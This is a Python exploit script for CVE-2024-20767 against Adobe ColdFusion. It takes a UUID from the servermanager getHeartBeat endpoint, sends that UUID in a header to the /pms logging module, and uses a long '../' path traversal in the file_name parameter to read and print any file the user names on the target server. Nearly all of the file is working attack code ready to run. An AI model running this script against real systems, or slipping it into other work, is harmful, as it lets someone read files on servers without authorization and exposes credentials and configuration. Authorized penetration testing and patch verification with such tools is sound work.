import requests
import argparse
from urllib.parse import urlparse
import threading
import re
import sys
import urllib3

urllib3.disable_warnings((urllib3.exceptions.InsecureRequestWarning))

def ascii():
    art = print("""   _  _         _     _   _          ___ _       
 | || |__ _ __| |__ | |_| |_  ___  | _ \ |__ _ _ _  ___| |_ 
 | __ / _` / _| / / |  _| ' \/ -_) |  _/ / _` | ' \/ -_)  _|
 |_||_\__,_\__|_\_\  \__|_||_\___| |_| |_\__,_|_||_\___|\__|
""")
    return art
    
def exploit(targetUrl, targetPort, targetFile):
    print("[+] Exploiting....\n")
    
    heartBeatUrl = targetUrl + ":" + targetPort + "/CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat"
    response = requests.get(heartBeatUrl, verify=False)
    try:
        if response.status_code == 200:
            pattern = r"<var name='uuid'><string>(.*?)</string></var>"
            uuid_match = re.findall(pattern, response.text)  #Extracting the UUID from the response using the regex pattern
            uuid = uuid_match[0]
            
            print("[+] UUID extracted: " + uuid)
            if uuid:
                print("\n Reading the target file with the retrieved UUID \n")
                readFileUrl = targetUrl + ":" + targetPort + "/pms?module=logging&file_name=../../../../../../../../../../../../../.." + targetFile + "&number_of_lines=10000"
                headers = { "uuid": uuid }
                reponseTwo = requests.get(readFileUrl, verify=False, headers = headers) #Reading the target file with the UUID in the header
                
                if len(reponseTwo.text) < 3:
                    print("Either the specified file could not be found or there are no necessary permissions to read it")
                else:
                    print(reponseTwo.text)              
            
        else:
            print("UUID not found in response")
            
    except:
        sys.exit("Could not establish connection or the target is not vulnerable :(")


def main():
    parser = argparse.ArgumentParser(description="CVE-2024-20767")
    parser.add_argument("-u", '--targetUrl', required=True, help="The target URL")
    parser.add_argument("-p", '--targetPort', required=True, help="The target Port")
    parser.add_argument("-f", '--targetFile', required=True, help="The target File")
    args = parser.parse_args()
    try:
        ascii()
        return(exploit(args.targetUrl, args.targetPort, args. targetFile))
            
    except Exception as e:
        sys.exit("Some error occured..")
        
if __name__ == "__main__":
    main()
